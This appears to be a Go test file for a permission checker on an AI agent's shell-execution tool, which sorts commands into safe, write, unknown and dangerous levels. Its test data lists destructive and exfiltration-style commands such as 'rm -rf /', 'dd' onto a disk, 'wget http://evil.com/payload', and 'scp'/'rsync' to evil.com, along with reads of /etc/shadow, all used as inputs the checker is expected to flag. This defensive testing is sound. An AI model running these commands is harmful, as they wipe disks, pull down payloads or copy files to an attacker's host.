package tools

import (
	"context"
	"encoding/json"
	"strings"
	"testing"

	"mvdan.cc/sh/v3/syntax"

	"github.com/PineappleBond/eino-demo-dev/server/internal/eino/permission"
)

// ── NeedPermission tests ──

func TestExecutePerm_NeedPermission(t *testing.T) {
	tests := []struct {
		name         string
		workspaceDir string
		input        any
		wantNil      bool
		want         *permission.PermissionRequest
	}{
		// empty / nil → safe
		{
			name:    "empty command",
			input:   map[string]any{"command": ""},
			wantNil: true,
		},
		{
			name:    "nil input",
			input:   nil,
			wantNil: true,
		},

		// safe no-path commands → always safe regardless of workspace
		{
			name:    "echo is safe (no path)",
			input:   map[string]any{"command": "echo hello"},
			wantNil: true,
		},
		{
			name:    "pwd is safe",
			input:   map[string]any{"command": "pwd"},
			wantNil: true,
		},
		{
			name:    "whoami is safe",
			input:   map[string]any{"command": "whoami"},
			wantNil: true,
		},
		{
			name:    "date is safe",
			input:   map[string]any{"command": "date"},
			wantNil: true,
		},
		{
			name:    "uname is safe",
			input:   map[string]any{"command": "uname -a"},
			wantNil: true,
		},
		{
			name:    "id is safe",
			input:   map[string]any{"command": "id"},
			wantNil: true,
		},
		{
			name:    "true is safe",
			input:   map[string]any{"command": "true"},
			wantNil: true,
		},
		{
			name:    "false is safe",
			input:   map[string]any{"command": "false"},
			wantNil: true,
		},
		{
			name:    "sleep is safe",
			input:   map[string]any{"command": "sleep 1"},
			wantNil: true,
		},

		// safe read commands within workspace → safe
		{
			name:         "ls within workspace is safe",
			workspaceDir: "/workspace",
			input:        map[string]any{"command": "ls -la src"},
			wantNil:      true,
		},
		{
			name:         "cat relative path within workspace",
			workspaceDir: "/workspace",
			input:        map[string]any{"command": "cat README.md"},
			wantNil:      true,
		},
		{
			name:         "ls absolute path within workspace",
			workspaceDir: "/workspace",
			input:        map[string]any{"command": "ls /workspace/src"},
			wantNil:      true,
		},
		{
			name:         "head within workspace",
			workspaceDir: "/workspace",
			input:        map[string]any{"command": "head -n 10 file.txt"},
			wantNil:      true,
		},
		{
			name:         "tail within workspace",
			workspaceDir: "/workspace",
			input:        map[string]any{"command": "tail -n 5 file.txt"},
			wantNil:      true,
		},
		{
			name:         "stat within workspace",
			workspaceDir: "/workspace",
			input:        map[string]any{"command": "stat file.txt"},
			wantNil:      true,
		},
		{
			name:         "file within workspace",
			workspaceDir: "/workspace",
			input:        map[string]any{"command": "file image.png"},
			wantNil:      true,
		},

		// safe read commands outside workspace → needs permission
		{
			name:         "ls path outside workspace",
			workspaceDir: "/workspace",
			input:        map[string]any{"command": "ls /etc/passwd"},
			want: &permission.PermissionRequest{
				Action:      "ls",
				Content:     "执行读取命令(路径超出workspace): ls /etc/passwd, 危险路径: /etc/passwd",
				ToolName:    "execute",
				ToolDesc:    "执行 shell 命令",
				ArgsSummary: "ls /etc/passwd",
				ToolLevel:   3,
			},
		},
		{
			name:         "cat path outside workspace",
			workspaceDir: "/workspace",
			input:        map[string]any{"command": "cat /etc/shadow"},
			want: &permission.PermissionRequest{
				Action:      "cat",
				Content:     "执行读取命令(路径超出workspace): cat /etc/shadow, 危险路径: /etc/shadow",
				ToolName:    "execute",
				ToolDesc:    "执行 shell 命令",
				ArgsSummary: "cat /etc/shadow",
				ToolLevel:   3,
			},
		},

		// write commands within workspace → needs permission (level 3)
		{
			name:         "mkdir within workspace needs permission",
			workspaceDir: "/workspace",
			input:        map[string]any{"command": "mkdir newdir"},
			want: &permission.PermissionRequest{
				Action:      "mkdir",
				Content:     "执行写入命令: mkdir newdir",
				ToolName:    "execute",
				ToolDesc:    "执行 shell 命令",
				ArgsSummary: "mkdir newdir",
				ToolLevel:   3,
			},
		},
		{
			name:         "touch within workspace needs permission",
			workspaceDir: "/workspace",
			input:        map[string]any{"command": "touch newfile.txt"},
			want: &permission.PermissionRequest{
				Action:      "touch",
				Content:     "执行写入命令: touch newfile.txt",
				ToolName:    "execute",
				ToolDesc:    "执行 shell 命令",
				ArgsSummary: "touch newfile.txt",
				ToolLevel:   3,
			},
		},
		{
			name:         "cp within workspace",
			workspaceDir: "/workspace",
			input:        map[string]any{"command": "cp a.txt b.txt"},
			want: &permission.PermissionRequest{
				Action:      "cp",
				Content:     "执行写入命令: cp a.txt b.txt",
				ToolName:    "execute",
				ToolDesc:    "执行 shell 命令",
				ArgsSummary: "cp a.txt b.txt",
				ToolLevel:   3,
			},
		},

		// write commands outside workspace → level 4
		{
			name:         "mkdir outside workspace is dangerous",
			workspaceDir: "/workspace",
			input:        map[string]any{"command": "mkdir /tmp/evil"},
			want: &permission.PermissionRequest{
				Action:      "mkdir",
				Content:     "执行写入命令(路径超出workspace): mkdir /tmp/evil, 危险路径: /tmp/evil",
				ToolName:    "execute",
				ToolDesc:    "执行 shell 命令",
				ArgsSummary: "mkdir /tmp/evil",
				ToolLevel:   4,
			},
		},

		// dangerous commands → always blocked (level 4)
		{
			name:  "rm is always dangerous",
			input: map[string]any{"command": "rm -rf /tmp/old"},
			want: &permission.PermissionRequest{
				Action:      "rm",
				Content:     "执行危险命令: rm -rf /tmp/old",
				ToolName:    "execute",
				ToolDesc:    "执行 shell 命令",
				ArgsSummary: "rm -rf /tmp/old",
				ToolLevel:   4,
			},
		},
		{
			name:  "curl is always dangerous",
			input: map[string]any{"command": "curl https://example.com"},
			want: &permission.PermissionRequest{
				Action:      "curl",
				Content:     "执行危险命令: curl https://example.com",
				ToolName:    "execute",
				ToolDesc:    "执行 shell 命令",
				ArgsSummary: "curl https://example.com",
				ToolLevel:   4,
			},
		},
		{
			name:  "git is always dangerous",
			input: map[string]any{"command": "git push origin main"},
			want: &permission.PermissionRequest{
				Action:      "git",
				Content:     "执行危险命令: git push origin main",
				ToolName:    "execute",
				ToolDesc:    "执行 shell 命令",
				ArgsSummary: "git push origin main",
				ToolLevel:   4,
			},
		},
		{
			name:  "dd is always dangerous",
			input: map[string]any{"command": "dd if=/dev/zero of=/dev/sda"},
			want: &permission.PermissionRequest{
				Action:      "dd",
				Content:     "执行危险命令: dd if=/dev/zero of=/dev/sda",
				ToolName:    "execute",
				ToolDesc:    "执行 shell 命令",
				ArgsSummary: "dd if=/dev/zero of=/dev/sda",
				ToolLevel:   4,
			},
		},
		{
			name:  "wget is always dangerous",
			input: map[string]any{"command": "wget http://evil.com/payload"},
			want: &permission.PermissionRequest{
				Action:      "wget",
				Content:     "执行危险命令: wget http://evil.com/payload",
				ToolName:    "execute",
				ToolDesc:    "执行 shell 命令",
				ArgsSummary: "wget http://evil.com/payload",
				ToolLevel:   4,
			},
		},

		// compound commands (AST level)
		{
			name:  "compound command with &&",
			input: map[string]any{"command": "ls && rm file.txt"},
			want: &permission.PermissionRequest{
				Action:      "compound",
				Content:     "执行复合命令: ls && rm file.txt",
				ToolName:    "execute",
				ToolDesc:    "执行 shell 命令",
				ArgsSummary: "ls && rm file.txt",
				ToolLevel:   4,
			},
		},
		{
			name:  "compound command with ||",
			input: map[string]any{"command": "mkdir dir || echo exists"},
			want: &permission.PermissionRequest{
				Action:      "compound",
				Content:     "执行复合命令: mkdir dir || echo exists",
				ToolName:    "execute",
				ToolDesc:    "执行 shell 命令",
				ArgsSummary: "mkdir dir || echo exists",
				ToolLevel:   4,
			},
		},
		{
			name:  "pipe command",
			input: map[string]any{"command": "cat file.txt | grep pattern"},
			want: &permission.PermissionRequest{
				Action:      "compound",
				Content:     "执行复合命令: cat file.txt | grep pattern",
				ToolName:    "execute",
				ToolDesc:    "执行 shell 命令",
				ArgsSummary: "cat file.txt | grep pattern",
				ToolLevel:   4,
			},
		},
		// multi-statement: analyzed individually, not blanket-rejected
		{
			name:  "semicolon: unknown cmd + safe cmd",
			input: map[string]any{"command": "cd /tmp; ls"},
			want: &permission.PermissionRequest{
				Action:      "multi",
				Content:     "执行多命令: 执行未知命令: cd /tmp",
				ToolName:    "execute",
				ToolDesc:    "执行 shell 命令",
				ArgsSummary: "cd /tmp; ls",
				ToolLevel:   3,
			},
		},
		{
			name:    "multi-line: all safe cmds",
			input:   map[string]any{"command": "ls\ncat file.txt"},
			wantNil: true,
		},
		{
			name:  "semicolon with dangerous cmd",
			input: map[string]any{"command": "echo hello; rm -rf /"},
			want: &permission.PermissionRequest{
				Action:      "multi",
				Content:     "执行多命令: 执行危险命令: rm -rf /",
				ToolName:    "execute",
				ToolDesc:    "执行 shell 命令",
				ArgsSummary: "echo hello; rm -rf /",
				ToolLevel:   4,
			},
		},
		{
			name:  "background command",
			input: map[string]any{"command": "sleep 10 &"},
			want: &permission.PermissionRequest{
				Action:      "compound",
				Content:     "执行后台命令: sleep 10 &",
				ToolName:    "execute",
				ToolDesc:    "执行 shell 命令",
				ArgsSummary: "sleep 10 &",
				ToolLevel:   4,
			},
		},
		{
			name:  "negated command",
			input: map[string]any{"command": "! ls"},
			want: &permission.PermissionRequest{
				Action:      "compound",
				Content:     "执行否定命令: ! ls",
				ToolName:    "execute",
				ToolDesc:    "执行 shell 命令",
				ArgsSummary: "! ls",
				ToolLevel:   4,
			},
		},
		{
			name:  "subshell",
			input: map[string]any{"command": "(cd /tmp && ls)"},
			want: &permission.PermissionRequest{
				Action:      "compound",
				Content:     "执行子shell: (cd /tmp && ls)",
				ToolName:    "execute",
				ToolDesc:    "执行 shell 命令",
				ArgsSummary: "(cd /tmp && ls)",
				ToolLevel:   4,
			},
		},
		{
			name:  "block",
			input: map[string]any{"command": "{ ls; pwd; }"},
			want: &permission.PermissionRequest{
				Action:      "compound",
				Content:     "执行命令块: { ls; pwd; }",
				ToolName:    "execute",
				ToolDesc:    "执行 shell 命令",
				ArgsSummary: "{ ls; pwd; }",
				ToolLevel:   4,
			},
		},
		{
			name:  "if clause",
			input: map[string]any{"command": "if ls; then echo ok; fi"},
			want: &permission.PermissionRequest{
				Action:      "compound",
				Content:     "执行条件命令: if ls; then echo ok; fi",
				ToolName:    "execute",
				ToolDesc:    "执行 shell 命令",
				ArgsSummary: "if ls; then echo ok; fi",
				ToolLevel:   4,
			},
		},
		{
			name:  "for loop",
			input: map[string]any{"command": "for i in 1 2 3; do echo $i; done"},
			want: &permission.PermissionRequest{
				Action:      "compound",
				Content:     "执行循环命令: for i in 1 2 3; do echo $i; done",
				ToolName:    "execute",
				ToolDesc:    "执行 shell 命令",
				ArgsSummary: "for i in 1 2 3; do echo $i; done",
				ToolLevel:   4,
			},
		},
		{
			name:  "while loop",
			input: map[string]any{"command": "while true; do sleep 1; done"},
			want: &permission.PermissionRequest{
				Action:      "compound",
				Content:     "执行循环命令: while true; do sleep 1; done",
				ToolName:    "execute",
				ToolDesc:    "执行 shell 命令",
				ArgsSummary: "while true; do sleep 1; done",
				ToolLevel:   4,
			},
		},
		{
			name:  "function declaration",
			input: map[string]any{"command": "foo() { echo bar; }"},
			want: &permission.PermissionRequest{
				Action:      "compound",
				Content:     "执行函数声明: foo() { echo bar; }",
				ToolName:    "execute",
				ToolDesc:    "执行 shell 命令",
				ArgsSummary: "foo() { echo bar; }",
				ToolLevel:   4,
			},
		},

		// system commands
		{
			name:         "find within workspace",
			workspaceDir: "/workspace",
			input:        map[string]any{"command": "find . -name '*.go'"},
			want: &permission.PermissionRequest{
				Action:      "find",
				Content:     "执行系统命令: find . -name '*.go'",
				ToolName:    "execute",
				ToolDesc:    "执行 shell 命令",
				ArgsSummary: "find . -name '*.go'",
				ToolLevel:   2,
			},
		},
		{
			name:         "find outside workspace",
			workspaceDir: "/workspace",
			input:        map[string]any{"command": "find / -name passwd"},
			want: &permission.PermissionRequest{
				Action:      "find",
				Content:     "执行系统命令(路径超出workspace): find / -name passwd, 危险路径: /",
				ToolName:    "execute",
				ToolDesc:    "执行 shell 命令",
				ArgsSummary: "find / -name passwd",
				ToolLevel:   3,
			},
		},
		{
			name:  "grep no path flag only",
			input: map[string]any{"command": "grep -r pattern"},
			want: &permission.PermissionRequest{
				Action:      "grep",
				Content:     "执行系统命令: grep -r pattern",
				ToolName:    "execute",
				ToolDesc:    "执行 shell 命令",
				ArgsSummary: "grep -r pattern",
				ToolLevel:   2,
			},
		},

		// unknown commands → level 3
		{
			name:  "unknown command defaults to level 3",
			input: map[string]any{"command": "some_weird_cmd --flag"},
			want: &permission.PermissionRequest{
				Action:      "some_weird_cmd",
				Content:     "执行未知命令: some_weird_cmd --flag",
				ToolName:    "execute",
				ToolDesc:    "执行 shell 命令",
				ArgsSummary: "some_weird_cmd --flag",
				ToolLevel:   3,
			},
		},

		// echo is always safe regardless of length
		{
			name:    "long echo command is always safe",
			input:   map[string]any{"command": "echo " + repeatStr("x", 250)},
			wantNil: true,
		},
		// rm with long content → truncated
		{
			name:  "long dangerous command truncates args summary",
			input: map[string]any{"command": "rm " + repeatStr("x", 250)},
			want: &permission.PermissionRequest{
				Action:      "rm",
				Content:     "执行危险命令: rm " + repeatStr("x", 250),
				ToolName:    "execute",
				ToolDesc:    "执行 shell 命令",
				ArgsSummary: truncateString("rm "+repeatStr("x", 250), 200),
				ToolLevel:   4,
			},
		},

		// parse error → let LLM decide
		{
			name:  "unparseable command",
			input: map[string]any{"command": "((("},
			want: &permission.PermissionRequest{
				Action:      "unknown",
				Content:     "执行命令(无法解析): (((",
				ToolName:    "execute",
				ToolDesc:    "执行 shell 命令",
				ArgsSummary: "(((",
				ToolLevel:   3,
			},
		},

		// variable assignment only → safe (no command execution)
		{
			name:    "variable assignment only",
			input:   map[string]any{"command": "FOO=bar"},
			wantNil: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			p := &executePerm{workspaceDir: tt.workspaceDir}
			got := p.NeedPermission(tt.input)

			if tt.wantNil {
				if got != nil {
					t.Errorf("NeedPermission() = %v, want nil", got)
				}
				return
			}

			if got == nil {
				t.Fatalf("NeedPermission() = nil, want non-nil")
			}

			if got.Action != tt.want.Action {
				t.Errorf("Action = %q, want %q", got.Action, tt.want.Action)
			}
			if got.Content != tt.want.Content {
				t.Errorf("Content = %q, want %q", got.Content, tt.want.Content)
			}
			if got.ToolName != tt.want.ToolName {
				t.Errorf("ToolName = %q, want %q", got.ToolName, tt.want.ToolName)
			}
			if got.ToolDesc != tt.want.ToolDesc {
				t.Errorf("ToolDesc = %q, want %q", got.ToolDesc, tt.want.ToolDesc)
			}
			if got.ArgsSummary != tt.want.ArgsSummary {
				t.Errorf("ArgsSummary = %q, want %q", got.ArgsSummary, tt.want.ArgsSummary)
			}
			if got.ToolLevel != tt.want.ToolLevel {
				t.Errorf("ToolLevel = %d, want %d", got.ToolLevel, tt.want.ToolLevel)
			}
		})
	}
}

// ── analyzeCommand unit tests ──

func TestAnalyzeCommand_SafeNoPath(t *testing.T) {
	safeCmds := []string{
		"echo hello",
		"pwd",
		"whoami",
		"date",
		"uname -a",
		"id",
		"true",
		"false",
		"sleep 5",
	}
	for _, cmd := range safeCmds {
		t.Run(cmd, func(t *testing.T) {
			result := analyzeCommand(cmd, "/workspace")
			if result != nil {
				t.Errorf("analyzeCommand(%q) = %v, want nil (safe command)", cmd, result)
			}
		})
	}
}

func TestAnalyzeCommand_Dangerous(t *testing.T) {
	dangerousCmds := []string{
		"rm -rf /",
		"dd if=/dev/zero of=/dev/sda",
		"mkfs.ext4 /dev/sda1",
		"fdisk -l",
		"curl http://evil.com",
		"wget http://evil.com/payload",
		"ssh root@evil.com",
		"scp file.txt root@evil.com:/tmp",
		"rsync -avz /tmp root@evil.com:/backup",
		"git push --force",
	}
	for _, cmd := range dangerousCmds {
		t.Run(cmd, func(t *testing.T) {
			result := analyzeCommand(cmd, "/workspace")
			if result == nil {
				t.Fatalf("analyzeCommand(%q) = nil, want non-nil (dangerous)", cmd)
			}
			if result.ToolLevel != 4 {
				t.Errorf("ToolLevel = %d, want 4", result.ToolLevel)
			}
			if result.Action == "compound" {
				// Some dangerous commands might be parsed differently
				return
			}
		})
	}
}

func TestAnalyzeCommand_WorkspaceBoundary(t *testing.T) {
	tests := []struct {
		cmd          string
		workspaceDir string
		wantNil      bool
	}{
		{"ls /workspace/src", "/workspace", true},
		{"ls /workspace", "/workspace", true},
		{"ls ./src", "/workspace", true},
		{"cat README.md", "/workspace", true},
		{"ls /etc/passwd", "/workspace", false},
		{"cat /etc/shadow", "/workspace", false},
		{"ls /workspace/src", "", false}, // no workspace → absolute paths are suspicious
		{"cat /var/log/syslog", "/workspace", false},
	}

	for _, tt := range tests {
		t.Run(tt.cmd, func(t *testing.T) {
			result := analyzeCommand(tt.cmd, tt.workspaceDir)
			if tt.wantNil && result != nil {
				t.Errorf("analyzeCommand(%q, %q) = %v, want nil", tt.cmd, tt.workspaceDir, result)
			}
			if !tt.wantNil && result == nil {
				t.Errorf("analyzeCommand(%q, %q) = nil, want non-nil", tt.cmd, tt.workspaceDir)
			}
		})
	}
}

func TestAnalyzeCommand_Compound(t *testing.T) {
	compoundCmds := []string{
		"ls && rm file",
		"cmd1 || cmd2",
		"cat file | grep pattern",
		"sleep 10 &",
		"! ls",
		"(echo hello)",
		"{ ls; }",
		"if true; then echo yes; fi",
		"for i in 1 2; do echo $i; done",
		"while true; do sleep 1; done",
		"func() { echo hello; }",
	}
	for _, cmd := range compoundCmds {
		t.Run(cmd, func(t *testing.T) {
			result := analyzeCommand(cmd, "/workspace")
			if result == nil {
				t.Fatalf("analyzeCommand(%q) = nil, want non-nil (compound)", cmd)
			}
			if result.ToolLevel < 3 {
				t.Errorf("ToolLevel = %d, want >= 3 for compound", result.ToolLevel)
			}
		})
	}
}

// ── safe multi-statement tests ──

func TestAnalyzeCommand_SafeMultiStmt(t *testing.T) {
	safeCmds := []string{
		"ls; pwd",
		"echo hello; echo world",
		"date; whoami",
	}
	for _, cmd := range safeCmds {
		t.Run(cmd, func(t *testing.T) {
			result := analyzeCommand(cmd, "/workspace")
			if result != nil {
				t.Errorf("analyzeCommand(%q) = %v, want nil (all safe)", cmd, result)
			}
		})
	}
}

// ── path extraction tests ──

func TestExtractPaths(t *testing.T) {
	tests := []struct {
		cmd          string
		workspaceDir string
		wantPaths    []string
	}{
		{
			cmd:          "ls -la src",
			workspaceDir: "/workspace",
			wantPaths:    []string{"/workspace/src"},
		},
		{
			cmd:          "cat README.md",
			workspaceDir: "/workspace",
			wantPaths:    []string{"/workspace/README.md"},
		},
		{
			cmd:          "ls /etc/passwd",
			workspaceDir: "/workspace",
			wantPaths:    []string{"/etc/passwd"},
		},
		{
			cmd:          "cp src.txt dst.txt",
			workspaceDir: "/workspace",
			wantPaths:    []string{"/workspace/src.txt", "/workspace/dst.txt"},
		},
		{
			cmd:          "mkdir -p a/b/c",
			workspaceDir: "/workspace",
			wantPaths:    []string{"/workspace/a/b/c"},
		},
		{
			cmd:          "find . -name '*.go'",
			workspaceDir: "/workspace",
			wantPaths:    []string{"/workspace"},
		},
		{
			cmd:          "echo 'hello /etc/passwd'",
			workspaceDir: "/workspace",
			wantPaths:    []string{}, // single-quoted args aren't simple literals via word.Lit()
		},
	}

	for _, tt := range tests {
		t.Run(tt.cmd, func(t *testing.T) {
			f, err := syntax.NewParser().Parse(strings.NewReader(tt.cmd), "")
			if err != nil {
				t.Fatalf("parse error: %v", err)
			}
			call := f.Stmts[0].Cmd.(*syntax.CallExpr)
			got := extractPaths(call, tt.workspaceDir)
			if len(got) != len(tt.wantPaths) {
				t.Errorf("extractPaths() = %v, want %v", got, tt.wantPaths)
				return
			}
			for i, p := range got {
				if p != tt.wantPaths[i] {
					t.Errorf("extractPaths()[%d] = %q, want %q", i, p, tt.wantPaths[i])
				}
			}
		})
	}
}

func TestCheckPathsOutOfBounds(t *testing.T) {
	tests := []struct {
		paths        []string
		workspaceDir string
		wantOOB      []string
	}{
		{
			paths:        []string{"/workspace/src", "/workspace/lib"},
			workspaceDir: "/workspace",
			wantOOB:      nil,
		},
		{
			paths:        []string{"/etc/passwd", "/workspace/src"},
			workspaceDir: "/workspace",
			wantOOB:      []string{"/etc/passwd"},
		},
		{
			paths:        []string{"/workspace"},
			workspaceDir: "/workspace",
			wantOOB:      nil, // workspace itself is OK
		},
		{
			paths:        []string{"/tmp/evil", "/var/log"},
			workspaceDir: "/workspace",
			wantOOB:      []string{"/tmp/evil", "/var/log"},
		},
		{
			paths:        []string{"/etc/passwd"},
			workspaceDir: "",
			wantOOB:      []string{"/etc/passwd"}, // no workspace → all absolute paths are OOB
		},
		{
			paths:        []string{"./relative"},
			workspaceDir: "/workspace",
			wantOOB:      []string{"./relative"}, // unresolved relative path is out of bounds
		},
	}

	for _, tt := range tests {
		t.Run(strings.Join(tt.paths, ","), func(t *testing.T) {
			got := checkPathsOutOfBounds(tt.paths, tt.workspaceDir)
			if len(got) != len(tt.wantOOB) {
				t.Errorf("checkPathsOutOfBounds() = %v, want %v", got, tt.wantOOB)
				return
			}
			for i, p := range got {
				if p != tt.wantOOB[i] {
					t.Errorf("outOfBounds[%d] = %q, want %q", i, p, tt.wantOOB[i])
				}
			}
		})
	}
}

func TestResolvePath(t *testing.T) {
	tests := []struct {
		path         string
		workspaceDir string
		want         string
	}{
		{"src", "/workspace", "/workspace/src"},
		{"../escape", "/workspace", "/escape"},
		{"/absolute", "/workspace", "/absolute"},
		{"", "/workspace", "/workspace"}, // filepath.Join returns workspace for empty path
		{"file.txt", "", ""},             // no workspace → can't resolve relative
	}

	for _, tt := range tests {
		t.Run(tt.path, func(t *testing.T) {
			got := resolvePath(tt.path, tt.workspaceDir)
			if got != tt.want {
				t.Errorf("resolvePath(%q, %q) = %q, want %q", tt.path, tt.workspaceDir, got, tt.want)
			}
		})
	}
}

func TestWordToLiteral(t *testing.T) {
	tests := []struct {
		cmd  string
		want string
	}{
		{"echo hello", "echo"},
		{"ls -la", "ls"},
		{"cat 'file with spaces.txt'", "cat"},
	}

	for _, tt := range tests {
		t.Run(tt.cmd, func(t *testing.T) {
			f, err := syntax.NewParser().Parse(strings.NewReader(tt.cmd), "")
			if err != nil {
				t.Fatalf("parse error: %v", err)
			}
			call := f.Stmts[0].Cmd.(*syntax.CallExpr)
			got := wordToLiteral(call.Args[0])
			if got != tt.want {
				t.Errorf("wordToLiteral() = %q, want %q", got, tt.want)
			}
		})
	}
}

func TestIsNumber(t *testing.T) {
	tests := []struct {
		s    string
		want bool
	}{
		{"123", true},
		{"0", true},
		{"42", true},
		{"", false},
		{"abc", false},
		{"12abc", false},
	}

	for _, tt := range tests {
		t.Run(tt.s, func(t *testing.T) {
			got := isNumber(tt.s)
			if got != tt.want {
				t.Errorf("isNumber(%q) = %v, want %v", tt.s, got, tt.want)
			}
		})
	}
}

// ── existing method tests ──

func TestExecutePerm_Info(t *testing.T) {
	p := &executePerm{}
	info, err := p.Info(context.Background())
	if err != nil {
		t.Fatalf("Info() error = %v", err)
	}
	if info.Name != "execute" {
		t.Errorf("Info().Name = %q, want %q", info.Name, "execute")
	}
	if info.Desc != "Execute a shell command and return the output" {
		t.Errorf("Info().Desc = %q, want %q", info.Desc, "Execute a shell command and return the output")
	}
}

func TestExecutePerm_InvokableRun(t *testing.T) {
	p := &executePerm{}

	// Invalid JSON
	result, err := p.InvokableRun(context.Background(), "not-json")
	if err != nil {
		t.Fatalf("InvokableRun() unexpected error = %v", err)
	}
	if result == "" {
		t.Error("InvokableRun() should return error message for invalid JSON")
	}

	// Empty command
	result, err = p.InvokableRun(context.Background(), `{"command": ""}`)
	if err != nil {
		t.Fatalf("InvokableRun() unexpected error = %v", err)
	}
	if result == "" {
		t.Error("InvokableRun() should return error message for empty command")
	}

	// Valid command
	result, err = p.InvokableRun(context.Background(), `{"command": "echo hello"}`)
	if err != nil {
		t.Fatalf("InvokableRun() unexpected error = %v", err)
	}
	if result != "hello\n" {
		t.Errorf("InvokableRun() = %q, want %q", result, "hello\n")
	}
}

func TestExecutePerm_InvokableRun_NonZeroExit(t *testing.T) {
	p := &executePerm{}
	result, err := p.InvokableRun(context.Background(), `{"command": "false"}`)
	if err != nil {
		t.Fatalf("InvokableRun() unexpected error = %v", err)
	}
	if result == "" {
		t.Error("InvokableRun() should return output for non-zero exit")
	}
}

func TestExecutePerm_InvokableRun_CommandNotFound(t *testing.T) {
	p := &executePerm{}
	result, err := p.InvokableRun(context.Background(), `{"command": "nonexistent_cmd_xyz123"}`)
	if err != nil {
		t.Fatalf("InvokableRun() unexpected error = %v", err)
	}
	if result == "" {
		t.Error("InvokableRun() should return error message for command not found")
	}
}

func TestExecutePerm_InvokableRun_WithWorkspace(t *testing.T) {
	p := &executePerm{workspaceDir: "/tmp"}
	input := map[string]any{"command": "pwd"}
	inputJSON, _ := json.Marshal(input)
	result, err := p.InvokableRun(context.Background(), string(inputJSON))
	if err != nil {
		t.Fatalf("InvokableRun() unexpected error = %v", err)
	}
	if result != "/tmp\n" {
		t.Errorf("InvokableRun() = %q, want %q", result, "/tmp\n")
	}
}

func TestExecutePerm_NeedPermission_NilInput(t *testing.T) {
	p := &executePerm{}
	got := p.NeedPermission(nil)
	if got != nil {
		t.Errorf("NeedPermission(nil) = %v, want nil", got)
	}
}

func repeatStr(s string, n int) string {
	result := make([]byte, n*len(s))
	for i := range n {
		copy(result[i*len(s):], s)
	}
	return string(result)
}
